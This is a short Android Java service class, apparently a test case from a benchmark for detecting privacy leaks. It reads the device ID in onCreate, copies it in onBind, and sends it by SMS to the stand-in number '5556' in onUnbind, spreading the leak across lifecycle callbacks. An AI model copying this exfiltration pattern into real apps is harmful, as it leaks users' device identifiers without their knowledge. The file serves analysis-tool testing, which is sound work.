package edu.uta;

import java.util.Random;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class ServiceEventSequence3 extends Service {

    private final IBinder mBinder = new LocalBinder();
    private final Random mGenerator = new Random();
    private String d1= "";
    private String d2 = "";
    private String d3 = "";


    @Override
    public void onCreate()
    {
    	super.onCreate();
		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		this.d1 = tMgr.getDeviceId();
    	
    }
    public class LocalBinder extends Binder {
        ServiceEventSequence3 getService() {
            return ServiceEventSequence3.this;
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        this.d2 = this.d1;
		
        return mBinder;
    }
    
    @Override
    public boolean onUnbind(Intent intent)
    {
    	super.onUnbind(intent);
       	SmsManager.getDefault().sendTextMessage("5556", null, d2, null, null);
    	
    	return false;
    }

}
